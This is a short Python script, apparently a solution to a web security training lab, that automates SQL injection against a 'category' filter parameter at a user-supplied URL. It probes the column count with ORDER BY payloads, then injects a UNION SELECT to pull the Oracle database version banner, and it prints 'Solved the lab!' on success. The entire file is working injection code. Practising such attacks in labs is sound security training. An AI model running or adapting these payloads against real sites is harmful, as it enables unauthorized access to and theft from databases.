import requests

url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    order_url = f"{url}/filter?category=Accessories'+ORDER+BY+{i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break
        
if i == 1:
    union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+banner+FROM+v$version--"
else:
    null_values = ",+".join(["NULL"] * (i - 1))
    union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+banner,+{null_values}+FROM+v$version--"

response = requests.get(union_url)

if response.status_code == 200:
    print("Solved the lab!")
